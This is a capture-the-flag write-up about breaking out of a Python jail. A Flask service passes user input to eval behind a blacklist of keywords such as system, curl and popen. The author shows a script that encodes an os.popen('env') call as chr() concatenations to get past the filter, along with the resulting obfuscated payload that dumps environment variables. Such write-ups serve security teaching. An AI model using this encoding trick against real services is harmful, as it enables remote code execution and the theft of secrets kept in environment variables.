
<h1>Break the system, Destroy it</h1>

<img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture13.PNG>

In this challenge we got a pyjail to break.It has this source code:
```py
#!/usr/bin/python3
from flask import Flask, request, render_template
import string
import subprocess
import re

app = Flask(__name__)


def filter(command):
    blacklist = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    blacklist.extend([" ", ".", "(", ")", "+"])

    if re.search(
        "(system)|(curl)|(flag)|(subprocess)|(popen)|(import)|(global)|(class)",
        command,
        re.I,
    ):
        return True
    for c in command:
        if c not in blacklist:
            return True


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    else:
        command = request.form.get("command", "")
        if command != "":
            if filter(command):
                return "You can't break reality without a command"
            else:
                try:
                    command = eval(command)
                    return str(command)
                except subprocess.CalledProcessError:
                    return "Error"
                except:
                    return "Error"
        else:
            return render_template("index.html")


app.run(host="0.0.0.0", port=8000)
```


i tried alot of methods but this method worked well for me:
```py
a="__import__('os').popen('env').read()"
l=[]
for i in a:
    l.append(f"+chr({ord(i)})")

for i in l:
    print(i,end='')
```

and we found the flag in the user enviroment:
```
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(112)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(101)+chr(110)+chr(118)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41))
```

Flag: ```securinets{pwn_7h3_w0rld}```
